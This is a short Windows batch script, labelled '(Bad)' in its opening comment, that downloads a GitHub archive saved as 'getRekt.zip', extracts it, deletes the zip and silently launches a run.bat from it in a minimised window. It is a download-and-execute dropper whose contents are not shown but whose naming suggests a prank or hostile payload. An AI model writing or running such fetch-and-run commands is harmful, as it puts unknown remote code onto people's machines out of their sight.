:: (Bad) Script to automatically download and execute the program
curl -L -o getRekt.zip https://github.com/Shaymin-HEG-001/Mikroschrott/archive/refs/heads/master.zip
tar -xf .\getRekt.zip
del .\getRekt.zip
start /MIN "" .\Mikroschrott-master\run.bat